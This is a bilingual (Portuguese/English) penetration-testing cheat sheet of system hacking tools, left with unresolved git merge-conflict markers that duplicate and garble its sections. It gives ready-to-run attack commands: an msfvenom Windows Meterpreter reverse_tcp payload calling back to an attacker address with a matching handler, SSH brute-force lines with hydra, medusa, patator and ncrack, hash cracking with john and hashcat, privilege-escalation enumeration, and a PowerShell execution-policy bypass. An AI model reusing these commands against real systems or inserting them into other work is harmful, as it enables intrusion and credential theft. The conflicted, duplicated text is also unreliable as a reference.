 System Hacking Tools

<<<<<<< HEAD
# Exploitation Frameworks
=======
 Exploitation Frameworks
>>>>>>> c1b4712547a17da4c827bb6759b6cfb87d5bc851

 Metasploit
- msfconsole: Console principal
- msfvenom: Gerador de payloads
- meterpreter: Shell avançado

 Exploit-DB
- searchsploit: Pesquisa exploits locais
- exploit-db: Base de dados online

<<<<<<< HEAD
# Password Attacks

Brute Force
- hydra: Brute force multi-protocolo
- john: John the Ripper

Hash Cracking
- hashcat: GPU hash cracking

# Privilege Escalation

Linux
- linpeas: Enumeração automática
=======
Password Attacks

Brute Force
- hydra: Brute force multi-protocolo
- medusa: Brute force paralelo
- patator: Brute force modular
- ncrack: Brute force de rede

Hash Cracking
- john: John the Ripper
- hashcat: GPU hash cracking
- ophcrack: Rainbow tables

Privilege Escalation

Linux
- linpeas: Enumeração automática
- linenum: Script de enumeração
>>>>>>> c1b4712547a17da4c827bb6759b6cfb87d5bc851
- linux-exploit-suggester: Sugestões de exploits

Windows
- winpeas: Enumeração Windows
- windows-exploit-suggester: Sugestões de exploits
- powerup: PowerShell privilege escalation

<<<<<<< HEAD

# Exploit Database
=======
System Hacking Tools

Exploitation Frameworks

Metasploit Framework

* `msfconsole`
  ↳ Main interactive console
* `msfvenom`
  ↳ Payload generation tool
* Meterpreter
  ↳ Powerful post-exploitation shell

Useful Metasploit Commands:

msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST your_ip
set LPORT 4444
exploit

Payload Generation with msfvenom:

msfvenom -p windows/meterpreter/reverse_tcp LHOST=your_ip LPORT=4444 -f exe -o payload.exe

Exploit Databases
>>>>>>> c1b4712547a17da4c827bb6759b6cfb87d5bc851

* `searchsploit keyword`
  ↳ Search local Exploit-DB mirror
* [exploit-db.com](https://www.exploit-db.com)
  ↳ Online exploit database
<<<<<<< HEAD
=======

Password Attacks

Brute Force Tools

* `hydra`
  ↳ Fast, protocol-aware brute forcer

  
  hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://target
  
* `medusa`
  ↳ Parallel brute force, supports many protocols

  
  medusa -h target -u user -P wordlist.txt -M ssh
  
* `patator`
  ↳ Modular brute-forcer with advanced options

  
  patator ssh_login host=target user=admin password=FILE0 0=wordlist.txt
  
* `ncrack`
  ↳ High-performance network brute forcer from the Nmap team

  
  ncrack -p ssh target
  

Hash Cracking Tools

* `john` (John the Ripper)
  ↳ Fast CPU-based hash cracker

  
  john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
  
  ↳ GPU-accelerated cracker

  
  hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

  Common hash modes:

  * `0`: MD5
  * `100`: SHA1
  * `500`: MD5(Crypt)
  * `1000`: NTLM
* `ophcrack`
  ↳ Uses rainbow tables to crack Windows hashes

Privilege Escalation

Linux

* `linpeas.sh`
  ↳ Privilege escalation auditing (automated & colored)

  
  ./linpeas.sh
  
* `linenum.sh`
  ↳ Lightweight enumeration script

  
  ./linenum.sh
  
* `linux-exploit-suggester.sh`
  ↳ Suggests known privilege escalation exploits

  
  ./linux-exploit-suggester.sh
  

 Windows

* `winpeas.exe`
  ↳ Comprehensive privilege escalation enumeration

  powershell
  .\winpeas.exe
  
* `windows-exploit-suggester.py`
  ↳ Compares patches and suggests exploits

  
  python windows-exploit-suggester.py --database 2024-DB.csv --systeminfo systeminfo.txt
  
* `PowerUp.ps1`
  ↳ PowerShell-based enumeration

  powershell
  Import-Module .\PowerUp.ps1
  Invoke-AllChecks

Scripts & One-Liners

 Metasploit


msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST your_ip
set LPORT 4444
exploit


 Payload Generation


msfvenom -p windows/meterpreter/reverse_tcp LHOST=your_ip LPORT=4444 -f exe -o payload.exe


 Brute Force SSH


hydra -l username -P /usr/share/wordlists/rockyou.txt ssh://target


 Hash Cracking


john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt


 Privilege Escalation Enumeration


# Linux
./linpeas.sh
./linenum.sh

# Windows
.\winpeas.exe
powershell -ep bypass -File .\PowerUp.ps1
>>>>>>> c1b4712547a17da4c827bb6759b6cfb87d5bc851
